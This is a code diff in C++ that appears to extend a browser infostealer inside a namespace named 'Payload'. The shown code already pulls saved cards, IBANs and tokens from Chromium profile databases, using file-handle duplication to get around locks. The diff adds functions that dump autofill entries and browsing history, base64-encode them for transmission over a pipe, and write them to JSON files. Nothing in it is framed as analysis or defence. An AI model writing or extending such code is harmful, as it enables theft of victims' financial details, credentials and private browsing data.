@@ -186,13 +186,25 @@ namespace Payload {
         } catch(...) {}
 
         try {
-            // Cards & IBANs & Tokens (Web Data)
+            // Cards & IBANs & Tokens & Autofill (Web Data)
             auto webDataPath = profilePath / "Web Data";
             if (std::filesystem::exists(webDataPath)) {
                 if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
                     ExtractCards(db, m_outputBase / browserName / profilePath.filename() / "cards.json");
                     ExtractIBANs(db, m_outputBase / browserName / profilePath.filename() / "iban.json");
                     ExtractTokens(db, m_outputBase / browserName / profilePath.filename() / "tokens.json");
+                    ExtractAutofill(db, m_outputBase / browserName / profilePath.filename() / "autofill.json");
+                    sqlite3_close(db);
+                }
+            }
+        } catch(...) {}
+
+        try {
+            // History
+            auto historyPath = profilePath / "History";
+            if (std::filesystem::exists(historyPath)) {
+                if (auto db = OpenDatabaseWithHandleDuplication(historyPath)) {
+                    ExtractHistory(db, m_outputBase / browserName / profilePath.filename() / "history.json");
                     sqlite3_close(db);
                 }
             }
@@ -534,6 +546,101 @@ namespace Payload {
             for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
             out << "]";
             m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
+        }
+    }
+
+    // NEW: Autofill extraction method
+    void DataExtractor::ExtractAutofill(sqlite3* db, const std::filesystem::path& outFile) {
+        sqlite3_stmt* stmt;
+        const char* query = "SELECT name, value FROM autofill";
+        
+        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
+
+        std::vector<std::string> entries;
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            const char* fieldName = (const char*)sqlite3_column_text(stmt, 0);
+            const char* value = (const char*)sqlite3_column_text(stmt, 1);
+            
+            if (fieldName && value) {
+                std::string fieldNameStr = fieldName;
+                std::string valueStr = value;
+                
+                // Base64 encode ALL fields for pipe transmission
+                std::string encodedFieldName = Base64Encode(fieldNameStr);
+                std::string encodedValue = Base64Encode(valueStr);
+                
+                // Format: AUTOFILL_DETAIL:BASE64(field_name)|BASE64(value)
+                std::string autofillMsg = "AUTOFILL_DETAIL:" + encodedFieldName + "|" + encodedValue;
+                m_pipe.Log(autofillMsg);
+
+                // JSON output
+                std::stringstream ss;
+                ss << "{\"field_name\":\"" << EscapeJson(fieldNameStr) << "\","
+                   << "\"value\":\"" << EscapeJson(valueStr) << "\"}";
+                entries.push_back(ss.str());
+            }
+        }
+        sqlite3_finalize(stmt);
+
+        if (!entries.empty()) {
+            std::filesystem::create_directories(outFile.parent_path());
+            std::ofstream out(outFile);
+            out << "[\n";
+            for (size_t i = 0; i < entries.size(); ++i) {
+                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            }
+            out << "]";
+            m_pipe.Log("AUTOFILL:" + std::to_string(entries.size()));
+        }
+    }
+
+    // NEW: History extraction method
+    void DataExtractor::ExtractHistory(sqlite3* db, const std::filesystem::path& outFile) {
+        sqlite3_stmt* stmt;
+        const char* query = "SELECT url, title, visit_count, last_visit_time FROM urls";
+        
+        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
+
+        std::vector<std::string> entries;
+        while (sqlite3_step(stmt) == SQLITE_ROW) {
+            const char* url = (const char*)sqlite3_column_text(stmt, 0);
+            const char* title = (const char*)sqlite3_column_text(stmt, 1);
+            
+            if (url && title) {
+                std::string urlStr = url;
+                std::string titleStr = title;
+                int visitCount = sqlite3_column_int(stmt, 2);
+                sqlite3_int64 lastVisitTime = sqlite3_column_int64(stmt, 3);
+                
+                // Base64 encode text fields for pipe transmission
+                std::string encodedUrl = Base64Encode(urlStr);
+                std::string encodedTitle = Base64Encode(titleStr);
+                
+                // Format: HISTORY_DETAIL:BASE64(url)|BASE64(title)|visit_count|last_visit_time
+                std::string historyMsg = "HISTORY_DETAIL:" + encodedUrl + "|" + encodedTitle + "|" +
+                                        std::to_string(visitCount) + "|" + std::to_string(lastVisitTime);
+                m_pipe.Log(historyMsg);
+
+                // JSON output
+                std::stringstream ss;
+                ss << "{\"url\":\"" << EscapeJson(urlStr) << "\","
+                   << "\"title\":\"" << EscapeJson(titleStr) << "\","
+                   << "\"visit_count\":" << visitCount << ","
+                   << "\"last_visit_time\":" << lastVisitTime << "}";
+                entries.push_back(ss.str());
+            }
+        }
+        sqlite3_finalize(stmt);
+
+        if (!entries.empty()) {
+            std::filesystem::create_directories(outFile.parent_path());
+            std::ofstream out(outFile);
+            out << "[\n";
+            for (size_t i = 0; i < entries.size(); ++i) {
+                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
+            }
+            out << "]";
+            m_pipe.Log("HISTORY:" + std::to_string(entries.size()));
         }
     }
 
